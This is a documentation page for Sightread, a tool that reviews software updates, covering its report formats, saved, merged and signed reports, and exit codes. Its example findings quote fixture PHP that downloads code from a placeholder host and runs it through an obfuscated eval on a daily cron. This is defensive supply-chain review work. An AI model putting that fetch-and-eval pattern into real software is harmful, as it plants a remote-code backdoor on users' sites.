Sightread writes the same review in six forms: the terminal report, plain text, JSON, JSON lines, Markdown for pull requests, a standalone HTML page and SARIF for GitHub code scanning. This page shows each one, how to save, merge, render and sign reports and what is in the JSON.

The examples on this page come from Sightread's testbed (a fixture registry on 127.0.0.1); `b01-widget` is a fixture modelled on a real WordPress.org plugin takeover. Long absolute paths are shortened with `...`.

```sh
rhythm sightread all                            # the terminal report
rhythm sightread all -o review.html --open      # also an HTML report, opened when done
rhythm sightread all -q -o review.json -o review.md -o review.sarif
rhythm sightread changes --md                   # Markdown on stdout, for a job summary
rhythm sightread report review.json -o review.html
rhythm sightread report review.json --md        # a saved report as Markdown on stdout
```

On a review, `-o <file>` picks the format by extension (`.json`, `.jsonl`, `.md`, `.html`, `.sarif`) and repeats. Each file is written whole once the run is complete, readable by you only (mode 0600). `--json`, `--jsonl`, `--md`, `--html` and `--sarif` print one format on stdout instead of the terminal report. `report` takes the same flags except `.jsonl` and `--jsonl`: the JSON lines stream exists only while a review runs.

## Terminal

On a terminal, one update gets a header, the facts, the findings grouped by severity and a verdict box:

```text
$ rhythm sightread plugin b01-widget --path projects/wp
reviewing 1 of 1: b01-widget 2.6.7 → 2.6.8

  ♪ rhythm sightread 1.0.0  wp-plugin b01-widget  2.6.7 → 2.6.8
  ────────────────────────────────────────────────────────────────────────
  Read-only. Sightread changes nothing on your site and never runs the
  code it downloads.

  ▸ Installed     2.6.7 in wp-content/plugins/b01-widget · matches
                  wordpress.org ✓
  ▸ Candidate     2.6.8 · released 2026-10-28 · latest
  ▸ Integrity     both versions: matches WordPress.org's own checksums
                  (both come from WordPress.org, so this proves the copy
                  was not changed on the way, not what the author
                  intended) ✓
  ▸ Publisher     changed: wponlinesupport → essentialplugin
  ▸ Diff          2 files changed, 1 added · +11 −4 lines · 136 B → 514 B
  ▸ Changelog     2.6.8: "Check compatibility with WordPress 6.8"

  CRITICAL  1 ────────────────────────────────────────────────────────────

 ▌  CRITICAL   Fetches remote code and runs it
 ▌             includes/class-analytics.php:3 #1
 ▌             $body =
 ▌             wp_remote_retrieve_body(wp_remote_get('https://analytics.wp
 ▌             os-cdn.example/v2/p'));…
 ▌             → Hold the update. Nothing local can tell you what the
 ▌               downloaded code will do.
...
  MEDIUM  2 ──────────────────────────────────────────────────────────────

 ▌  MEDIUM     Schedules a new background task
 ▌             includes/class-analytics.php:7 #6
 ▌             wp_schedule_event(time()+3600,'daily','wpos_cron');
 ▌             → Check what the new background task does.
...
 ╭──────────────────────────────────────────────────────────────────────╮
 │  VERDICT                                                       HOLD  │
 │  ■ 1 critical   ■ 4 high   ■ 2 medium                                │
 │  Sightread reports what changed. It does not judge intent.           │
 ╰──────────────────────────────────────────────────────────────────────╯
  1 update reviewed · 2 archives verified · 0 from cache · 200ms

  → the full diff:
    rhythm sightread plugin b01-widget --path projects/wp -o review.html --open
  → explain a finding: rhythm sightread explain remote-fetch-exec
  → record a review:
    rhythm sightread allow wp-plugin:b01-widget@2.6.8 --reason "..."
```

| Part | What it says |
|---|---|
| `▸ Installed` | the installed version and where it was read; `matches wordpress.org ✓` when the copy on disk was compared with the official one |
| `▸ Candidate` | the version reviewed, its release date and why it was picked (`latest`, or the range that allows it) |
| `▸ Integrity` | what verified each side; see [Sources and integrity](Sightread-Sources-And-Integrity) |
| `▸ Publisher` | who published the candidate and whether that changed |
| `▸ Diff` | files changed and added, lines, size before and after |
| `▸ Changelog` | the candidate's changelog entry, or `none for this version` |
| `▸ Applied`, `▸ Roadie`, `▸ Soundcheck` | with `--soundcheck`; see [With Soundcheck and Roadie](Sightread-With-Soundcheck) |

Critical, high and medium findings have a `▌` bar, low and info a `●` or `·`. Each shows the file and line and its number (`#1`), the one `explain <report.json> <n>` takes, the evidence (at most 300 characters, cleaned and secret-masked), `raised by` when a context rule raised it, `likely: a heuristic, not an exact pattern` for a likely finding. The advice follows `→`. `--max-findings` (default 10) caps how many per update; `--diff` adds every changed hunk.

Several updates get a table first, worst first (HOLD, REVIEW, UNVERIFIED, ALLOWED, ROUTINE, then by name), then a card per HOLD and REVIEW, then Not checked, notes and next steps. Routine rows fold into `<n> updates with no risk signals` above 10. `→ update the routine ones:` gives the WP-CLI, `composer update` or `npm install` command for the ROUTINE and ALLOWED updates; Sightread never runs it. The footer always counts updates reviewed, archives verified, archives from cache and the time.

A box with no findings reads `No risk signals found. This is a static diff, not proof the update is safe.` A box with gaps adds `Incomplete review: ...`. A run where packages moved but none could be reviewed (a registry down, a tarball dependency) says `1 update couldn't be reviewed` where an empty run says `No updates to review`. Not checked names the move (`leftpadx 1.0.0 → 1.0.1`). An update reviewed with `--allow-unverified` shows what its findings alone would make it: `UNVERIFIED (would be HOLD)`. `!` lines under the header are notes: offline, hidden findings, a relaxed config in a pull request.

### Plain text

When stdout isn't a terminal, or with `--plain`, the same report has no color, boxes or glyphs:

```text
$ rhythm sightread plugin b01-widget --path projects/wp --plain
rhythm sightread 1.0.0 - wp-plugin b01-widget - 2.6.7 to 2.6.8
Read-only. Sightread changes nothing on your site and never runs the code it downloads.

Installed: 2.6.7 in wp-content/plugins/b01-widget, matches wordpress.org
Candidate: 2.6.8, released 2026-10-28, latest
Integrity: both versions: matches WordPress.org's own checksums (both come from WordPress.org, so this proves the copy was not changed on the way, not what the author intended)
Publisher: changed: wponlinesupport to essentialplugin
Diff: 2 files changed, 1 added, +11 -4 lines, 136 B to 514 B
Changelog: 2.6.8: "Check compatibility with WordPress 6.8"

[CRITICAL] Fetches remote code and runs it - includes/class-analytics.php:3
  evidence: $body = wp_remote_retrieve_body(wp_remote_get('https://analytics.wpos-cdn.example/v2/p')); … $f = 'ev'.'al'; $f($body);
  advice: Hold the update. Nothing local can tell you what the downloaded code will do.
[HIGH] New owner or publisher
  evidence: Contributors before: none listed; now: essentialplugin, wponlinesupport; published by essentialplugin
  advice: Read this release closely. The people behind it changed.
...
[MEDIUM, likely] Released very recently
  evidence: published 3 hours ago (2026-10-28 11:11 UTC); the minimum age is 72h
  advice: Wait a few days before installing it.

Verdict: HOLD
1 critical, 4 high, 2 medium
Sightread reports what changed. It does not judge intent.
1 update reviewed, 2 archives verified, 1 from cache, 0s

next: the full diff: rhythm sightread plugin b01-widget --path projects/wp -o review.html --open
next: explain a finding: rhythm sightread explain remote-fetch-exec
next: record a review: rhythm sightread allow wp-plugin:b01-widget@2.6.8 --reason "..."
```

`-q` keeps the verdicts and findings only:

```text
$ rhythm sightread plugin b04-roles g05-cron --fail-on high -q
VERDICT     UPDATE     FROM   TO     FINDINGS
REVIEW      b04-roles  2.0.0  2.0.1  2 high, 1 medium
ALLOWED     g05-cron   1.0.0  1.1.0  1 allowed

REVIEW: b04-roles 2.0.0 to 2.0.1
[HIGH, likely] Grants admin capabilities to another role - roles.php:3
  evidence: $r->add_cap('manage_options');
  advice: Check which role gets admin rights and whether the changelog says why.
...
```

Text from packages is cleaned for the terminal: escape sequences and bidirectional controls are shown as text, so a package can't recolor or rewrite your screen.

## JSON

`--json` (or `-o review.json`) writes the `rhythm-sightread/v1` document. Trimmed to the first finding:

```json
{
  "schema": "rhythm-sightread/v1",
  "kind": "review",
  "tool": "rhythm-sightread",
  "version": "1.0.0",
  "complete": true,
  "summary": {
    "updates": 1,
    "hold": 1,
    "review": 0,
    "routine": 0,
    "allowed": 0,
    "unverified": 0,
    "critical": 1,
    "high": 4,
    "medium": 2,
    "low": 0,
    "info": 0,
    "baselined": 0,
    "allowed_findings": 0,
    "ignored": 0,
    "demoted": 0,
    "not_checked": 0,
    "from_cache": 1,
    "hidden": 0
  },
  "verdict": "findings",
  "data": {
    "target": {
      "path": ".../home/shop",
      "repo_path": "",
      "kind": "wordpress",
      "wordpress": "6.8.3",
      "sites": []
    },
    "started": "2026-10-28T14:14:50.155453122Z",
    "duration_ms": 6,
    "stopped_by": "",
    "signal_pack": "2026.10.26",
    "names_pack": "2026.10.26",
    "fail_on": "",
    "min_confidence": "likely",
    "updates": [
      {
        "ecosystem": "wp-plugin",
        "name": "b01-widget",
        "from": {
          "version": "2.6.7",
          "source": "wordpress.org",
          "url": "https://127.0.0.1:18900/plugin/b01-widget.2.6.7.zip",
          "sha256": "5a6fa4ea51108f1805c5a3b5e20465dec0907048e65a0970f105944d4d918af9",
          "hash": "manifest",
          "verified": "checksums",
          "method": "matches WordPress.org's own checksums (both come from WordPress.org, so this proves the copy was not changed on the way, not what the author intended)",
          "released": null,
          "publisher": [
            "wponlinesupport"
          ],
          "latest": false,
          "wanted": false,
          "constraint": ""
        },
        "to": {
          "version": "2.6.8",
          "source": "wordpress.org",
          "url": "https://127.0.0.1:18900/plugin/b01-widget.2.6.8.zip",
          "sha256": "5a31d37970871e939016d3cd4c3aea76ea44760b13c4872f78edaf2177648664",
          "hash": "manifest",
          "verified": "checksums",
          "method": "matches WordPress.org's own checksums (both come from WordPress.org, so this proves the copy was not changed on the way, not what the author intended)",
          "released": "2026-10-28T11:11:00Z",
          "publisher": [
            "essentialplugin"
          ],
          "latest": true,
          "wanted": true,
          "constraint": ""
        },
        "installed": {
          "path": "wp-content/plugins/b01-widget",
          "lockfile": "wp-content/plugins/b01-widget/b01-widget.php",
          "lock_line": 4,
          "drift": false,
          "drift_files": []
        },
        "verdict": "hold",
        "diff": {
          "files_changed": 2,
          "files_added": 1,
          "files_removed": 0,
          "lines_added": 11,
          "lines_removed": 4,
          "bytes_from": 136,
          "bytes_to": 514
        },
        "changelog": [
          {
            "version": "2.6.8",
            "text": "* Check compatibility with WordPress 6.8",
            "generic": true
          }
        ],
        "findings": [
          {
            "id": "remote-fetch-exec",
            "name": "Fetches remote code and runs it",
            "severity": "critical",
            "confidence": "confirmed",
            "file": "includes/class-analytics.php",
            "line": 3,
            "end_line": 4,
            "evidence": "$body = wp_remote_retrieve_body(wp_remote_get('https://analytics.wpos-cdn.example/v2/p')); … $f = 'ev'.'al'; $f($body);",
            "domains": [],
            "raised_by": [],
            "demoted": "",
            "advice": "Hold the update. Nothing local can tell you what the downloaded code will do.",
            "help_uri": "https://github.com/RhythmShahriar/rhythm/wiki/Sightread-Signal-Reference#remote-fetch-exec",
            "fingerprint": "1e625065badd63fa",
            "allowed": null,
            "baselined": false,
            "ignored": false,
            "below_confidence": false
          },
          ...
        ],
        "hunks": [
          {
            "path": "includes/class-analytics.php",
            "old_start": 0,
            "old_lines": 0,
            "new_start": 1,
            "new_lines": 7,
            "lines": [
              "+<?php",
              "+add_action('wpos_cron', function(){",
              ...
            ]
          }
        ],
        "soundcheck": null,
        "errors": [],
        "sites": [],
        "from_cache": true,
        "hidden": 0
      }
    ],
    "not_checked": [],
    "warnings": [],
    "errors": [],
    "notes": []
  }
}
```

| Field | Meaning |
|---|---|
| `complete` | `false` when an update is UNVERIFIED, a fetch failed, a package was Not checked (except WordPress core and must-use plugins) or the run was interrupted |
| `verdict` | `ok`, `findings` or `error`, as in every Rhythm tool's JSON |
| `summary` | every key always present; `hidden` counts findings hidden by `--id`, `--exclude-id` and `--severity`; `not_checked` counts the entries of `data.not_checked` that make the run partial, so it leaves out WordPress core (`core`) and must-use plugins (`mu-plugin`), which are listed for information only |
| `data.target` | the reviewed folder; `repo_path` is the target inside its git repository (`.` for the root), empty outside one, kept with `--redact-paths` |
| `data.stopped_by` | `interrupted` or a deadline, when the run was cut short |
| `updates[].from`, `.to` | version, source, URL, sha256 (`hash: manifest` for WordPress.org), `verified`, `method`, release time, publisher |
| `updates[].installed` | where the installed version was read: folder, lockfile and line; `drift` with the files that differ from the official copy |
| `data.updates` | worst first: HOLD, REVIEW, UNVERIFIED, ALLOWED, ROUTINE, then by name, ecosystem and versions, the order the terminal and Markdown show, so `updates[0]` is the worst |
| `updates[].verdict` | `hold`, `review`, `routine`, `allowed` or `unverified` |
| `findings[].fingerprint` | the first 16 hex of a SHA-256 over ecosystem, name, candidate version, signal, file and normalised evidence; shared by `--baseline` and SARIF |
| `findings[].allowed` | `null`, or `{by, reason, date, until, source}` of the allow entry that covers it |
| `findings[].raised_by`, `.demoted` | context rules that raised or lowered it |
| `findings[].below_confidence` | a likely finding that `--min-confidence confirmed` keeps out of the verdict |
| `updates[].hunks` | the flagged hunks (every changed hunk with `--diff`); `"tokens": true` for a minified file compared in tokens |
| `updates[].soundcheck` | the `--soundcheck` result, or `null` |
| `data.not_checked` | `{ecosystem, name, version, to, reason, text, hint}` per package: `version` is the installed one, `to` the version it would move to when the run knew it; reasons in [Sources and integrity](Sightread-Sources-And-Integrity#not-checked) |
| `data.errors` | `{ecosystem, name, code, message}`, with the error code (`E7` and so on) |
| `data.notes` | the report's notes: offline, hidden findings, relaxed config |

Fields are only added within v1. The schema is [`docs/schema/rhythm-sightread-v1.json`](https://github.com/RhythmShahriar/sightread/blob/master/docs/schema/rhythm-sightread-v1.json). With `--redact-paths` (on when `CI` is set) paths are relative to the target, or start with `~`.

### JSON lines

`--jsonl` prints one `{"kind":"update", ...}` line per update as each finishes, with the same fields as an entry of `data.updates`, then the envelope without `data.updates`:

```text
$ rhythm sightread plugin b01-widget g05-cron --jsonl
{"kind":"update","ecosystem":"wp-plugin","name":"g05-cron","from":{"version":"1.0.0","source":"wordpress.org",...},...}
{"kind":"update","ecosystem":"wp-plugin","name":"b01-widget","from":{"version":"2.6.7","source":"wordpress.org",...},...}
{"schema":"rhythm-sightread/v1","kind":"review","tool":"rhythm-sightread","version":"1.0.0","complete":true,"summary":{"updates":2,"hold":1,"review":0,"routine":1,...},"verdict":"findings","data":{...}}
```

## Markdown

`--md` writes what the [GitHub Action](Sightread-CI) puts in the job summary and the pull request comment:

````text
$ rhythm sightread plugin b01-widget g05-cron --md
## Sightread: 1 to hold

| Verdict | Update | From | To | Findings |
|---|---|---|---|---|
| 🛑 HOLD | b01-widget (wp-plugin) | 2.6.7 | 2.6.8 | 1 critical, 4 high, 2 medium |
| ✅ ROUTINE | g05-cron (wp-plugin) | 1.0.0 | 1.1.0 | 1 low |

### 🛑 b01-widget 2.6.7 → 2.6.8

Integrity (both versions): matches WordPress.org's own checksums \(both come from WordPress.org, so this proves the copy was not changed on the way, not what the author intended\). Publisher changed: wponlinesupport → essentialplugin.
Changelog: 2.6.8: "Check compatibility with WordPress 6.8"

| Severity | Signal | Where | Evidence |
|---|---|---|---|
| critical | Fetches remote code and runs it | `includes/class-analytics.php:3` | `$body = wp_remote_retrieve_body(wp_remote_get('hxxps://analytics.wpos-cdn[.]example/v2/p')); … $f = 'ev'.'al'; $f($body);` |
| high | New owner or publisher | n/a | `Contributors before: none listed; now: essentialplugin, wponlinesupport; published by essentialplugin` |
...
| medium | Released very recently | n/a | `published 3 hours ago (2026-10-28 11:11 UTC); the minimum age is 72h` |

<details><summary>Diff of the flagged lines</summary>

```diff
@@ -0,0 +1,7 @@ includes/class-analytics.php
+<?php
+add_action('wpos_cron', function(){
+  $body = wp_remote_retrieve_body(wp_remote_get('hxxps://analytics.wpos-cdn[.]example/v2/p'));
+  $f = 'ev'.'al'; $f($body);
...
+wp_schedule_event(time()+3600,'daily','wpos_cron');
```
</details>

Record your review: `rhythm sightread allow wp-plugin:b01-widget@2.6.8 --reason "..."`

---

Static diff of official releases; Sightread never ran this code. Not proof an update is safe.

Sightread reports what changed. It does not judge intent.

[Signal reference](https://github.com/RhythmShahriar/rhythm/wiki/Sightread-Signal-Reference) · rhythm-sightread 1.0.0
````

The heading counts what needs a look (`## Sightread: 1 to hold and 2 to review`), or reads `## Sightread: no risk signals in <n> updates`. Status icons appear only in Markdown. URLs, `www.` names and the hosts a finding reports are defanged (`hxxps://`, `[.]`) and package text is escaped, so a comment can't ping anyone, link anywhere or render HTML. Routine rows fold into one `<details>` above 10. A report stays under GitHub's comment limit by trimming hunks first, with a note.

## HTML

`--html` or `-o review.html` writes one self-contained page: the update table (sortable), a card per update with integrity and the hash, the publisher, the changelog beside what the diff adds, the findings with their explain text, a diff viewer with the flagged hunks open and the other files collapsed, the Soundcheck result and the `allow` command to copy. It works offline and in light and dark. It loads nothing from outside and runs only its own script:

```text
<meta http-equiv="Content-Security-Policy" content="default-src &#39;none&#39;; style-src &#39;unsafe-inline&#39;; img-src data:; script-src &#39;sha256-iLOep9PpZP9sWLmwTXy8mR82A/7PfjJVQ66PrEwmKYU=&#39;">
```

Nothing from a package becomes markup, a link or an attribute. A fleet run (`all --sites`, `watch --html`) renders one page grouped by update. `--open` opens it when the run is done; a run that wrote one points at it in its next steps (`→ every finding and the full diff: in review.html`).

## SARIF

`--sarif` writes SARIF 2.1.0 for GitHub code scanning: one rule per signal with its help link and a result per finding.

```json
{
  "ruleId": "remote-fetch-exec",
  "level": "error",
  "message": {
    "text": "b01-widget 2.6.7 → 2.6.8: Fetches remote code and runs it (includes/class-analytics.php:3). Verdict HOLD."
  },
  "locations": [
    {
      "physicalLocation": {
        "artifactLocation": {
          "uri": ".",
          "uriBaseId": "SRCROOT"
        }
      }
    }
  ],
  "partialFingerprints": {
    "sightreadFinding/v1": "1e625065badd63fa"
  },
  "properties": {
    "ecosystem": "wp-plugin",
    "from": "2.6.7",
    "package": "b01-widget",
    "package_path": "includes/class-analytics.php",
    "security-severity": "9.5",
    "to": "2.6.8",
    "verdict": "hold"
  }
}
```

| Severity | SARIF level | `security-severity` |
|---|---|---|
| critical | `error` | 9.5 |
| high | `error` | 8.0 |
| medium | `warning` | 5.5 |
| low | `note` | 3.0 |
| info | `note` | 0.0 |

A result is located where the version is pinned: the lockfile line, or the plugin's main file when the site is in the repository (this run was outside a repository, so the location is the root, `.`). The path inside the package is in the message and `properties.package_path`, never a location, since code scanning ignores files that aren't committed. An update that couldn't be fetched or verified becomes a tool notification and `executionSuccessful: false`. Results are capped at GitHub's 25,000 per run, with a notification when cut.

## Saved reports

### report

`report` renders saved JSON reports with no network, by the extension of each `-o` file (`.md`, `.html`, `.sarif` or `.json`), or prints one format to stdout with `--md`, `--html`, `--sarif` or `--json`, for example `rhythm sightread report review.json --md >> "$GITHUB_STEP_SUMMARY"`. Several reports merge into one, worst first, for example the reports of several CI jobs:

```text
$ rhythm sightread report before.json npm.json -o merged.md -o merged.html -o merged.sarif
wrote merged.md
wrote merged.html
wrote merged.sarif
```

```text
## Sightread: 1 to hold and 2 to review

| Verdict | Update | From | To | Findings |
|---|---|---|---|---|
| 🛑 HOLD | colorlib (npm) | 2.1.0 | 2.1.1 | 1 critical, 4 high, 3 medium |
| ⚠️ REVIEW | b02-formtools (wp-plugin) | 1.4.0 | 1.4.1 | 3 high, 1 medium |
| ⚠️ REVIEW | b04-roles (wp-plugin) | 2.0.0 | 2.0.1 | 2 high, 1 medium |
| ✅ ROUTINE | patchlib (npm) | 2.0.0 | 2.0.1 | none |
...
```

Reports of one target keep it. Reports of several targets in one repository get their paths rewritten relative to the repository root, so SARIF from a merged report points at the same files as a direct run. `--diff` keeps every hunk the reports hold.

### explain

`rhythm sightread explain review.json 3` prints finding `#3` of a saved report, the number the terminal printed next to it, with its evidence and the diff hunk, read from the cached archives. A fingerprint works too. See [Your first review](Sightread-First-Review#4-read-a-finding).

### Signed reports

`--sign` writes `<file>.json.sig`, an Ed25519 signature, next to the JSON report. The key is created on first use in your config folder (`~/.config/rhythm/sightread/report-key` on Linux, mode 0600).

```text
$ rhythm sightread plugin b04-roles -q -o b04.json --sign
...
$ rhythm sightread verify-report b04.json
b04.json: signature good, signed by ed25519:3xAoIi5V8sudNsv2xkvPxar68UGO5Z4EW6DjIDtSAY8=
```

After the report was changed:

```text
$ rhythm sightread verify-report b04.json
rhythm sightread verify-report: b04.json: the signature doesn't check out (the report changed after it was signed (sha256 e09b9d935ec3 now, 6f0b4dc0c31b when signed))
  the report changed after it was signed, or its key isn't trusted here (add it with --key or trusted_keys)
```

Exit `0` good, `1` bad or untrusted, `2` a missing file. Another machine's report verifies with its public key: `--key report-key.pub`, or `trusted_keys: [ed25519:...]` in the config. A signature proves the report wasn't changed after signing and which key signed it; a local key proves only "this machine". In GitHub Actions, `attest: true` signs the JSON report under the workflow's identity instead.

## Exit codes

| Code | Means |
|---|---|
| `0` | ok |
| `1` | findings at `--fail-on` |
| `2` | usage error |
| `3` | couldn't fetch, verify or check a package (with `--fail-on`, unless `--allow-partial` or `--allow-unverified`), a run that reviewed nothing because every package failed to fetch (whatever the flags), or a failed Soundcheck run |
| `130` | interrupted |

The full table is in the [CLI reference](Sightread-CLI-Reference#exit-codes).

---
<sub>← [Configuration](Sightread-Configuration) · [Home](Home) · [Security model](Sightread-Security-Model) →</sub>
